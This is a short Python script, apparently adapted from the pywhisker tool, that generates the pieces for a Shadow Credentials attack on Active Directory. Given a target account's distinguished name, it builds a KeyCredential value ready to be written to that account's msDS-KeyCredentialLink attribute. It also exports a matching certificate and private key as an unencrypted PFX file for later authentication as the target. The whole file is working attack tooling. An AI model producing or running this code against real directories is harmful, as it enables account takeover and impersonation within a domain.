
import sys
import random
import string
# added for PFX-Export w/o pyOpenSSL
from cryptography import x509
from cryptography.hazmat.primitives.serialization.pkcs12 import serialize_key_and_certificates
from cryptography.hazmat.primitives.serialization import BestAvailableEncryption, NoEncryption
from cryptography.hazmat.backends import default_backend


# dsinternals
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime


#everything in here was stolen from pywhisker...just kept the relevant parts for generating the cert
#####################################################################################
#  Helper for PFX-Export with cryptography
#####################################################################################
def export_pfx_with_cryptography(pem_cert_file, pem_key_file, pfx_password=None, out_file='cert.pfx'):
    with open(pem_cert_file, 'rb') as f:
        pem_cert_data = f.read()
    with open(pem_key_file, 'rb') as f:
        pem_key_data = f.read()

    cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())

    from cryptography.hazmat.primitives import serialization
    key_obj = serialization.load_pem_private_key(pem_key_data, password=None, backend=default_backend())


    encryption_algo = NoEncryption()
    pfx_data = serialize_key_and_certificates(
        name=b"",
        key=key_obj,
        cert=cert_obj,
        cas=None,
        encryption_algorithm=encryption_algo
    )

    with open(out_file, 'wb') as f:
        f.write(pfx_data)

    print(f"[+] PFX exportiert nach: {out_file}")
    if pfx_password is not None:
        print(f"[i] Passwort für PFX: {pfx_password}")


def certificate_subject_from_dn(dn):
    """Return a short CN for the certificate while preserving dn as the owner."""
    first_rdn = dn.split(",", 1)[0].strip()
    subject = first_rdn[3:].strip() if first_rdn.casefold().startswith("cn=") else first_rdn

    if not subject:
        subject = "KeyCredential"

    # OpenSSL limits a certificate commonName to 64 encoded bytes.
    encoded_subject = subject.encode("utf-8")
    if len(encoded_subject) > 64:
        subject = encoded_subject[:64].decode("utf-8", errors="ignore")

    return subject

def main():

    if len(sys.argv) < 2:
        print("Missing target distinguished name. Ex: CN=User,DC=domain,DC=local")
        sys.exit()
    
    dn = sys.argv[1]
    certificate_subject = certificate_subject_from_dn(dn)
    certificate = X509Certificate2(certificate_subject, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=dn, currentTime=DateTime())
    print("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())


    path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))

    certificate.ExportPEM(path_to_files=path)
    pem_cert_file = path + "_cert.pem"
    pem_key_file  = path + "_priv.pem"

    out_pfx_file = path + ".pfx"

    print(f"Converting PEM -> PFX with cryptography: {out_pfx_file}")
    export_pfx_with_cryptography(pem_cert_file=pem_cert_file, 
                                    pem_key_file=pem_key_file,
                                    pfx_password=None,
                                    out_file=out_pfx_file)

main()
